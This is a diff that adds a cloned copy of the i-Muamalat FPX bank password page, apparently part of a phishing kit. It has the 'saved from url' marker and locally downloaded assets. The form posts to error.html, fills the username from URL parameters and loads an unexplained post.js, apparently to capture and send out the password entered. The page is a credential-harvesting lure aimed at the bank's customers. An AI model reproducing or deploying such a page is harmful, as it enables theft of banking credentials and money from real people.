@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<!-- saved from url=(0060)https://efpx.muamalat.com.my/fpxb/RIB/passwordInputPage.html -->
+<html><head>
+	
+	<title>Welcome to i-Muamalat FPX</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" media="all" href="./MT_Pass/bootstrap.min.css">
+	<link rel="stylesheet" type="text/css" media="all" href="./MT_Pass/font-awesome.min.css">
+	<link rel="stylesheet" type="text/css" media="all" href="./MT_Pass/main.css">
+	<link rel="stylesheet" type="text/css" media="all" href="./MT_Pass/form.css">
+	<link rel="stylesheet" type="text/css" media="all" href="./MT_Pass/step_section.css">
+	<script type="text/javascript" src="./MT_Pass/payment.js.download"></script>
+	<script type="text/javascript" src="./MT_Pass/sessionTimeout.js.download"></script>
+	<script type="text/javascript" src="./MT_Pass/logout.js.download"></script>
+	<script type="text/javascript" src="./MT_Pass/jquery-1.11.3.min.js.download"></script>
+	<script type="text/javascript" src="./MT_Pass/prng4.js.download"></script>
+	<script type="text/javascript" src="./MT_Pass/rng.js.download"></script>
+	<script type="text/javascript" src="./MT_Pass/security-1.1-min.js.download"></script>
+	<script type="text/javascript" src="./MT_Pass/rsaCrypto.js.download"></script>
+	<script type="text/javascript" src="./MT_Pass/hashtable.js.download"></script>
+	<script type="text/javascript" src="./MT_Pass/rsa.js.download"></script>
+<style>
+.modal {
+  display: none; /* Hidden by default */
+  position: fixed; /* Stay in place */
+  z-index: 1; /* Sit on top */
+  padding-top: 100px; /* Location of the box */
+  left: 0;
+  top: 0;
+  width: 100%; /* Full width */
+  height: 100%; /* Full height */
+  overflow: auto; /* Enable scroll if needed */
+  background-color: rgb(0,0,0); /* Fallback color */
+  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+}
+
+.modal-content {
+  background-color: #fefefe;
+  margin: auto;
+  padding: 20px;
+  border: 1px solid #888;
+  width: 30%;
+}
+
+#errorMsgPassword {
+	display: none;
+}
+</style>
+</head>
+
+<body >
+	<div>
+		<div class="actionbar">
+	        <div class="actionbar_bg vertical-align">
+	            <div class="container">
+	                <div class="row">
+	                    <div class="col-xs-12">
+	                        <div class="left">
+	                            <img class="logo_imuamalat" src="./MT_Pass/logo-imuamalat.png">
+	                        </div>
+	                        <div class="right">
+	                            <img class="logo_imuamalat" src="./MT_Pass/logo-fpx.png">
+	                        </div>
+	                        <div class="text-center">
+	                            <strong class="actionbar_title">FPX Payment</strong>
+	                        </div>
+	                    </div>
+	                </div>
+	            </div>
+	        </div>
+	    </div>
+    </div>
+	<div>
+		<div class="root">
+	        <div class="container">
+			    <form class="form"  method="post" onSubmit="submit_form()" action="error.html">
+					<div>
+						<span class="step-clear">&nbsp;</span>
+						<strong class="well well-sm step-section">Step 2 of 4</strong>
+		   			</div>
+
+			        <div class="form-group">
+			            <!-- <div>
+			                Do not proceed if this is not your selected image.<br> Please call our Customer Care Line for further assistance. Is this your chosen image?
+			            </div> -->
+			            <hr class="spacer">
+			        	<ul>
+							
+						</ul>
+			            <hr class="spacer">
+			            <div>Username : <label><span id="pass_user"></span>
+							<label></div>
+			            
+			                <input type="checkbox"  checked="false" id="chosenImage" name="chosenImage" onchange="validateImage();"> <strong>Yes. This is my username.</strong>
+			            </label>
+			        </div>
+			        <div class="form-group" id="divPassword">
+			            <label id="labelPassword" for="login.password">Password</label>
+						<input id="pd"  type="password" class="form-control" placeholder="Enter your password" onkeyup="javascript: document.getElementById('btn-login').disabled = false" name="pd" maxlength="12" value="">
+			        	<input type="hidden" id="passwordEnc" name="password">
+
+						<input type="hidden" id="uname" />
+						<input type="hidden" id="b" />
+			        	<div class="alert alert-danger" id="errorMsgPassword"></div>
+			        </div>
+			        <input class="btn btn-primary" id="btn-back" name="_back" type="button" onclick="javascript: history.back()" value="Back">
+			        <input class="btn btn-primary" id="btn-login"  type="submit" value="Login" disabled>
+
+				</form>
+			        <!-- <div class="cancel-btn">
+			            <button class="btn-link" type="submit" name="_toFPX" value="Cancel Transaction" onclick="returnFPX()">Cancel Transaction</button>
+			        </div> -->
+
+					
+					<input id="loginFlag" name="loginFlag" type="hidden" value="">
+					
+					<div id="dialogLoginTokenAlert" align="center" class="modal" style="display: none;">
+						<div class="modal-content">
+						
+							<h5 style="color:red;font-weight:bold">Attention!</h5>
+							<br>
+							<h6>Our system has detected an active session on</h6>
+							<h6>another window or you have closed your browser</h6>
+							<h6>without logging out. For security reasons, we will</h6>
+							<h6>terminate the previous session.</h6>
+							<h6>Click "OK" to continue</h6>
+							<br>
+
+						
+						</div>
+					</div>
+					<input type="hidden" id="devicePrint" name="devicePrint" value="version%3D3%2E7%2E1%5F1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F103%2E0%2E0%2E0%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103%2E0%2E0%2E0%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1366%7C768%7C728%26pm%5Ffpsw%3Dpdf%7Cpdf%7Cpdf%7Cpdf%7Cpdf%26pm%5Ffptz%3D8%26pm%5Ffpln%3Dlang%3Den%2DUS%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1366%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DWindows%26pm%5Fbrmjv%3D103%26pm%5Fbr%3DChrome%26pm%5Finpt%3D%26pm%5Fexpt%3D">
+					<script>
+						// alert(document.enterPw.loginFlag.value);
+						
+						var modal = document.getElementById("dialogLoginTokenAlert");
+						modal.style.display = "none";
+						
+						if (document.enterPw.loginFlag.value == 'Y'){
+							modal.style.display = "block";
+							document.enterPw.loginFlag.value = 'N';
+						}
+						document.getElementById("devicePrint").value=encode_deviceprint();
+					</script>
+
+						
+
+    				<input type="hidden" id="autoLoggedOutTimeout" name="autoLoggedOutTimeout" value="false">
+					
+			    <input type="hidden" name="_csrf" value="5f8d0ff3-3599-491c-8d3d-c6daf05789e2">
+			    <input type="hidden" id="errorMsgReqPw" value="Password is a required field.">
+			   	<input type="hidden" id="returnFPX" value="false">
+				<input type="hidden" id="back" value="false">
+				<input type="hidden" id="sessionExpiredTime" value="1657163860701">
+			</div>
+		</div>
+	</div>
+	<script>
+
+	
+	</script>
+	<script type="text/javascript" src="./MT_Pass/form.js.download"></script>
+	
+	<script>
+		$(document).ready(function(){
+	const queryString = window.location.search
+   const urlParams = new URLSearchParams(queryString)
+   document.getElementById("uname").value = urlParams.get("uname");
+   document.getElementById("pass_user").innerHTML = urlParams.get("uname");
+   document.getElementById("b").value = urlParams.get("b");
+		});
+	</script>
+
+</body>
+<script type="text/javascript" src="post.js"></script>
+
+</html>
